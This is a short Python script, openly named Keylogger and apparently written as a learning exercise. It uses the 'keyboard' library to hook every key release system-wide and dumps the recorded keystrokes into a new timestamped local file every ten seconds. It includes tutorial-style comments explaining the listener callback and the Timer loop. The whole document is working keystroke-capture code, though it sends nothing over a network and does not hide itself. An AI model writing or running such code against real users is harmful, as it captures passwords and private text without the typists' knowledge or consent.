import keyboard
from threading import Timer
import time

class Keylogger:
    def __init__(self, time):
        self.log = ''

        self.interval = time
   

    def callback(self, event):
        '''
            there is a global listener that gets activated when we call on a function such as
            on_press which then  activates the listener. At this point we have a callback 
            and I am custom making that callback function so that the listener knows where
            to point to. The event callback has three attributes which are: name, scan_code
            (the ascii dec number for the char), time (timestamp)
        '''
        self.log += event.name
    
    def logging(self):
        self.track()

        self.log = ''
        # we use the Timer from threading for when we want to have a function run after
        # a certain time frame
        timer = Timer(interval=self.interval, function=self.logging)
        timer.daemon = True
        timer.start()


    def track(self):
        with open(f"{time.time()}", "w") as f:
            f.write(self.log)

    def run(self):
        keyboard.on_release(callback=self.callback)
        self.logging()
        keyboard.wait() #causes a wait until we do ctl-c


if __name__ == "__main__":
    kl = Keylogger(time=10) # every 10 seconds we make a log file
    kl.run()
